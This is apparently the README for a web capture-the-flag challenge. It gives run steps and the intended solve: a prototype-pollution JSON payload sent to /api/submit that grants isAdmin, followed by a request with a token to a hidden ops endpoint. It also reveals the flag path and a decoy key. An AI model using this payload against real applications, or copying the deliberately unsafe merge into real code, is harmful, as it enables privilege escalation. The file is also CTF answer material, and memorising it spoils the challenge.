# OxCode — DOOMSDAY Web CTF

## Run locally

```bash
npm install
npm start
```

Open:

http://localhost:3000

## Docker

```bash
docker build -t oxcode-doomsday .
docker run --rm -p 3000:3000 oxcode-doomsday
```

## Intended solve path

1. Recon the page/source.
2. Notice the `/api/submit` endpoint.
3. Inspect the client-side JavaScript and discover the operator endpoint/token.
4. Discover `robots.txt` and the hidden/internal paths.
5. Identify that `/api/submit` recursively merges attacker-controlled JSON.
6. Abuse the intentional `__proto__` prototype-pollution bug to make a fresh object inherit `isAdmin: true`.
7. Request `/api/ops/omega?token=omega`.
8. Receive the real flag.

### Example prototype-pollution request

```http
POST /api/submit
Content-Type: application/json

{
  "meta": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

Then:

```http
GET /api/ops/omega?token=omega
```

The first obvious key:

```text
DOOM-KEY-7F3A
```

returns a decoy flag intentionally.

## Production/CTF safety

This project intentionally contains a vulnerable recursive merge. Run it isolated for the competition. Do not expose it as a general-purpose application or reuse `unsafeMerge` in production.
